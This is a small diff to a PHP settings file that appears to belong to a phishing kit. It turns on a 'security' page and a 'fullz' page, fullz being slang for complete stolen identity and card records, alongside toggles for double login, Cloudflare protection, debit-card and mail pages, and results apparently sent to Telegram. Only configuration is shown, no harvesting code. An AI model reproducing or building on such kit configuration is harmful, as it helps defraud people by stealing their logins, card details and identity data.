@@ -10,6 +10,8 @@ $tgresult = "on";  // DON'T change
 //page settings
 $doublelogin =  "off";
 $CFProtection = "on";
+$securitypage = "on";
+$fullzpage = "on";
 $debitpage = "off";
 $mailpage = "off";
 
